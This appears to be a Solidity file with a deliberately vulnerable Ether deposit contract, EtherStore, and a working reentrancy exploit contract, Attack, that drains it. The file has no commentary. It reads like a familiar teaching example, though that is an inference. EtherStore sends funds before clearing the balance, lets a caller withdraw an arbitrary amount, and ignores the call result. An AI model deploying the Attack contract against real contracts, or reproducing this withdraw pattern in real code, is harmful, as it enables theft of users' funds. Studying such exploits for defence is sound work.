pragma solidity ^0.8.13;

contract EtherStore {
      mapping(address => uint) public balances;
      address public owner;
   
      function deposit() public payable {
         balances[msg.sender] += msg.value;
      }
   
      function withdraw(uint amount) public {
         uint bal = balances[msg.sender];
         require(bal > 0);

         (bool success, ) = msg.sender.call{value: amount}("");

         balances[msg.sender] = 0;
      }
   
      function getBalance() public view returns (uint) {
         return address(this).balance;
      }
}

contract Attack {
      EtherStore public etherStore;
   
      constructor(address _etherStore) {
         etherStore = EtherStore(_etherStore);
      }

      fallback() external payable {
         if (address(etherStore).balance >= msg.value) {
            etherStore.withdraw(msg.value);
         }
      }
   
      function attack() public payable {
         require(msg.value >= 1 ether);
         etherStore.deposit{value: msg.value}();
         etherStore.withdraw(msg.value);
      }
   
      function getBalance() public view returns (uint) {
         return address(this).balance;
      }
   
      
}